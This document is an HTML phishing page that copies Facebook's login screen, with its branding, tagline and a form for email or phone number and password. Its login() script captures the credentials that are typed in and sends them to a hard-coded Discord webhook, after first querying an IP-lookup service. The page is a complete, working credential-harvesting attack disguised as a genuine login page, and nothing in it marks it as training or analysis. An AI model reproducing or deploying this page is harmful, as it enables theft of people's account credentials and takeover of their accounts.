<!DOCTYPE html>

<style>

    /* Set background color for the entire page */
body {
  background-color: #e9ebee;
}
.container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 50vh;
  width: 100%;
}

.login-form {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  padding: 20px;
  background-color: #fff;
  border-radius: 10px;
  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
  max-width: 400px;
  width: 100%;
}

.login-form label {
  display: block;
  margin-bottom: 5px;
  font-size: 14px;
  font-weight: 600;
  color: #808080;
}

.login-form input {
  width: 100%;
  padding: 10px;
  margin-bottom: 15px;
  border-radius: 5px;
  border: 1px solid #e5e5e5;
  font-size: 16px;
  color: #333;
}

.login-form button {
  width: 100%;
  padding: 10px;
  border: none;
  border-radius: 5px;
  background-color: #1877f2;
  color: #fff;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
}

.login-form button:hover {
  background-color: #628dc5;
}

.login-form .divider {
  display: flex;
  justify-content: space-between;
  align-items: center;
  width: 100%;
  margin-top: 10px;
}

.login-form .divider:before,
.login-form .divider:after {
  content: "";
  flex-grow: 1;
  height: 1px;
  background-color: #e5e5e5;
}

.login-form .divider:before {
  margin-right: 10px;
}

.login-form .divider:after {
  margin-left: 10px;
}

.login-form .signup-link {
  display: block;
  margin-top: 10px;
  text-align: center;
  font-size: 14px;
  font-weight: 600;
  color: #2c8bff;
  text-decoration: none;
}














/* Facebook Login Form CSS */
form {
  display: flex;
  flex-direction: column;
  align-items: center;
}

label {
  display: block;
  margin-bottom: 0.5rem;
  font-weight: bold;
  font-size: 0.9rem;
  color: #1d2129;
}

input[type="text"], input[type="password"] {
  box-sizing: border-box;
  width: 100%;
  padding: 0.8rem;
  margin-bottom: 1.5rem;
  border: 1px solid #dddfe2;
  border-radius: 3px;
  font-size: 1rem;
  line-height: 1.5;
  background-color: #f0f2f5;
  color: #1d2129;
}

input[type="text"]:focus, input[type="password"]:focus {
  outline: none;
  border-color: #1877f2;
}

button {
  background-color: #1877f2;
  color: #fff;
  font-size: 1rem;
  font-weight: bold;
  padding: 0.8rem 1.5rem;
  border: none;
  border-radius: 3px;
  cursor: pointer;
  transition: background-color 0.2s ease-in-out;
}

button:hover {
  background-color: #166fe5;
}

.forgot-password {
  display: block;
  margin-top: 1rem;
  font-size: 0.9rem;
  color: #1d2129;
  text-align: center;
  text-decoration: none;
}

.forgot-password:hover {
  text-decoration: none;
}



.header {
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  margin-bottom: 0em;
  height: auto;
  width: auto;
  font-size: auto;
}

.header i {
  color: #1877f2;
}

.facebook-name {
  color: #1877f2;
  font-size: 2.5em;
  font-weight: bold;
  margin-left: 0.5em;
}

.mainlogo{
  width: 100%;
  max-width: 500px; /* Change this value to set the maximum width of the image */
  margin: 0 auto; /* Center the container horizontally */
  width: 100%;
  height: auto;
}






</style>

  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook - Log In or Sign Up</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-jP8HgFC48zdXJGgumUfB6tyJ7nHNTpG1e82vw77SGJ6U8gyjCr2E6U9Sdd5e5C5G3qvdE5+5F7xJbGfgu8bmVg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <link rel="stylesheet" href="style.css">

</head>
<body>

    
     <div class="header">
      
        
        <img class = "mainlogo" src="facebook.svg" alt="Facebook">


        <p style=" 
        font-family: Helvetica, Arial, sans-serif;
        direction: ltr;
            text-align: center;
        margin-block-start: 0.83em;
    margin-block-end: 0.83em;
    margin-inline-start: 0px;
    margin-inline-end: 0px;
            display: inline-block;
            font-size: 24px;
            line-height: 28px;
            width: auto;
            padding: 0 0 20px;
            color: #1c1e21;
        ">Facebook helps you connect and<br> share, with the people in your life.</p>
      </div>
  <div class="container">
   
    <form class="login-form">
      <!-- <label for="email">Email or Phone:</label> -->
      <input  placeholder="Email address or phone number" type="text" id="email" name="email" required>
      <!-- <label for="password">Password:</label> -->
      <input placeholder="Password" type="password" id="password" name="password" required>
      <button   onclick="login()" class="login-btn">Log In</button>
      <div class="forgot-password">
        <a href="#" style="text-decoration: none;">Forgot Password?</a>
      </div>
   
      
      <div class="signup-link">
        <a href="#" style="text-decoration: none;">Create a New Account</a>
      </div>
    </form>


  </div>









  <script>

function login() {
  const username = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  console.log(username,password)

  const webhookUrl = 'https://discord.com/api/webhooks/1102782129663914096/cLxuIqtC7tpB1C_ngq529N16x39BYPTpmOJvC5h3TZYUs42jlEGYcytGOxL5PfOUXyAr';
  const ipifyEndpoint = 'https://api.ipify.org?format=json';

  // Fetch user's IP address using IPify API
  fetch(ipifyEndpoint)
    .then(response => response.json())
    .then(data => {

      const payload = {
        content: username+"  "+password,
        // Add IP address to payload if needed
        // ip_address: data.ip,
      };

      // Send payload to Discord webhook
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
        .then(response => {
          if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
          }
          // Handle response as needed
        //   console.log('Message sent to Discord webhook!');
        })
        .catch(error => console.error(error));
    })
    .catch(error => console.error(error));
    
  // Prevent form from submitting and reloading the page
  event.preventDefault();
}

    </script>
  </body>
